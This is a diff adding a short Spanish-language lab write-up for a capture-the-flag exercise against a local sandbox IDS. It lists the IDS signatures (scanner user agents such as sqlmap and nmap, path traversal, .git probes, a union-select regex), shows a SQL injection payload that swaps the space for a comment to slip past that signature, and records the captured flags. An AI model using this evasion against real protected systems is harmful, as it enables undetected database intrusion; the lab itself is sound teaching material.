@@ -1,0 +1,24 @@
+# Lab 10 — Parte C (Lautaro). R4 (evasion de firma) + apoyo para la fila sqli-union.
+# Entorno: sandbox Linux (server.py del lab en /app = WORKDIR del Dockerfile), phantomcorp -> 127.0.0.1.
+# Fecha: 2026-11-20T03:16:51Z UTC == 2026-11-20 00:16 -03
+
+### Ruleset publicado por el SOC (GET /soc/reglas) — firma objetivo:
+    === Ruleset del IDS (firmas activas) ===
+    Conocer las reglas es el primer paso para evadirlas. FLAG{signature_ruleset}
+      scanner-ua      User-Agent contiene sqlmap|nikto|nmap|dirb
+      path-traversal  la ruta contiene '../'
+      git-probe       la ruta contiene '/.git'
+      sqli-union      el query matchea /union\s+select/  (OJO: exige un ESPACIO)
+    
+    Una firma que exige un espacio se esquiva quitando el espacio. Pensá.
+
+### R4 — evasion de sqli-union con comentario en vez de espacio:
+$ GET /catalogo?item=1 union/**/select 1,2
+    200 OK (procesado como benigno)
+    Tu request ERA maliciosa pero NINGUNA firma la detectó. FLAG{signature_evaded}
+
+### contraste — la firma scanner-ua SI dispara (User-Agent sqlmap):
+$ curl -A sqlmap/1.7 /catalogo?item=1
+    🚨 ALERTA IDS · firma 'scanner-ua' disparada.
+    Tu request fue DETECTADA y logueada. FLAG{detection_triggered}
+    Para ver todas las reglas: GET /soc/reglas
